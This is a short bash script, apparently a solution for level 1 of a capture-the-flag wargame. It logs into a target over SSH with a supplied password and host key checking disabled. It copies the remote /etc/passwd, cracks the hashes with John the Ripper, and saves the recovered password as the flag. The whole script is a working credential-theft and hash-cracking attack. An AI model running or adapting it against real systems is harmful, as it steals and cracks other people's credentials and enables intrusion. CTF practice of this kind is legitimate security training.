#!/usr/bin/env bash

if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
    sshpass -p $3 scp -o StrictHostKeyChecking=no -P $2 level01@$1:/etc/passwd /tmp/
    cat /tmp/passwd
    echo -e "\nCracking with john...\n"
    john /tmp/passwd --format=crypt
    EXIT_STATUS=$?
    if ! (exit $EXIT_STATUS); then
        echo "Error decrypting passwd with john">&2
        exit 1
    fi
    flag=$(john /tmp/passwd --show | awk -F: 'NR==1 {print $2}')
    echo -e "Password:\n$flag"
    echo $flag > flag01.pwd
else
    echo "Usage: ./flag01.sh <ip address> <port> <password>"
fi
